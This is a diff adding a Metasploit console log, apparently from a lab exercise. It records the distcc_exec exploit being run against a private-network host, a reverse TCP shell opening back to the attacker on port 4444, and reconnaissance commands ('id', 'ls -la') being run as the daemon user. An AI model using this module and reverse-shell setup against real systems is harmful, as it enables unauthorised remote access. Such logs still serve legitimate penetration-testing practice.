@@ -1,0 +1,29 @@
+msf5 exploit(unix/misc/distcc_exec) > run
+
+[*] Started reverse TCP double handler on 192.168.1.14:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo hREPV3pNgojAHXp8;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "hREPV3pNgojAHXp8\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 2 opened (192.168.1.14:4444 -> 192.168.1.31:37460) at 2020-05-10 23:10:43 +0200
+
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+ls -la
+total 20
+drwxrwxrwt  4 root     root    4096 May 10 17:10 .
+drwxr-xr-x 21 root     root    4096 May 20  2012 ..
+drwxrwxrwt  2 root     root    4096 May 10 16:53 .ICE-unix
+-r--r--r--  1 root     root      11 May 10 16:54 .X0-lock
+drwxrwxrwt  2 root     root    4096 May 10 16:54 .X11-unix
+-rw-------  1 tomcat55 nogroup    0 May 10 16:54 5153.jsvc_up
+
+
+
+
